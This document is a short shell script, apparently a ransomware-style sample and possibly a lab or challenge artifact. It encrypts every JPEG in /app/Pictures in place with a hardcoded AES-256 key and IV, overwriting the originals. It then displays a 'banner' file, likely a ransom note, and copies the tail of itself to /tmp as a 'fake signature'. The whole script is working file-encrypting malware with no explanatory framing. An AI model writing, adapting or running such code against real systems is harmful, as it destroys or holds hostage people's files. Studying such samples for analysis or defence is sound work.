#!/bin/sh

K="e3c2b5dbf704f747382f034076852bdf"
V="8872043e2bb48760"
D="/app/Pictures"
B="/app/banner"

# Encrypt jpgs
for f in "$D"/*.jpg; do
  [ -f "$f" ] || continue
  openssl enc -aes-256-cbc -K "$K" -iv "$V" -in "$f" -out "$f.enc" 2>/dev/null
  mv "$f.enc" "$f"
done

# Show banner if exists
[ -f "$B" ] && cat "$B"

# Dump fake signature to temp
[ -f "$0" ] && tail -c 512 "$0" > /tmp/sig.sig
